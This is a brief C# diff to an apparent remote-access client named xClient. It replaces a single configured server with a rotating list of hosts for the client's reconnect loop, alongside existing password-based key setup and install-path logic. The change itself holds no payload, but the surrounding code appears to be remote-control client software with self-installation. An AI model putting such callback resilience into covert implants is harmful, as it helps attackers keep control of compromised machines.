@@ -21,6 +21,7 @@ namespace xClient
         private static volatile bool _connected = false;
         private static Mutex _appMutex;
         private static ApplicationContext _msgLoop;
+        private static HostsManager _hosts;
 
         [STAThread]
         private static void Main(string[] args)
@@ -116,6 +117,7 @@ namespace xClient
             Thread.Sleep(2000);
 
             AES.PreHashKey(Settings.PASSWORD);
+            _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
             SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
             SystemCore.MyPath = Application.ExecutablePath;
             SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
@@ -178,7 +180,9 @@ namespace xClient
                 {
                     Thread.Sleep(100 + new Random().Next(0, 250));
 
-                    ConnectClient.Connect(Settings.HOST, Settings.PORT);
+                    Host host = _hosts.GetNextHost();
+
+                    ConnectClient.Connect(host.Hostname, host.Port);
 
                     Thread.Sleep(200);
 
